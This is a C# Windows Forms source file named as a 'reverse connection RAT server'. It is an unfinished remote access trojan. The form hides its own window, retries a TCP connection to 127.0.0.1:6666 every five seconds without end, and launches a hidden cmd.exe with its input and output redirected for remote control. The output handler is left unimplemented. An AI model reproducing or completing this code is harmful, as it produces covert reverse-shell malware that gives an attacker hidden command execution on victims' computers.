using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace reverse_connection_rat_server
{
    public partial class Form1 : Form
    {

        TcpClient tcpClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCMD;
        StringBuilder strInput;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
            for(; ; )
            {
                RunServer();
                System.Threading.Thread.Sleep(5000); // 5 sec wait for tries
            }

        }

        private void RunServer()
        {
            tcpClient = new TcpClient();
            strInput = new StringBuilder();

            if (!tcpClient.Connected)
            {
                try
                {
                    tcpClient.Connect("127.0.0.1", 6666);
                    networkStream = tcpClient.GetStream();
                    streamReader = new StreamReader(networkStream);
                    streamWriter = new StreamWriter(networkStream);
                }
                catch (Exception err)
                {
                    return; // If client is missing, abort
                }

                processCMD = new Process();
                processCMD.StartInfo.FileName = "cmd.exe";
                processCMD.StartInfo.CreateNoWindow = true;
                processCMD.StartInfo.UseShellExecute = false;
                processCMD.StartInfo.RedirectStandardOutput = true;
                processCMD.StartInfo.RedirectStandardInput = true;
                processCMD.StartInfo.RedirectStandardError = true;
                processCMD.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                processCMD.Start();
                processCMD.BeginErrorReadLine();
            }
        }

        private void CmdOutputDataHandler(object sender, DataReceivedEventArgs e)
        {
            throw new NotImplementedException();
        }
    }
}
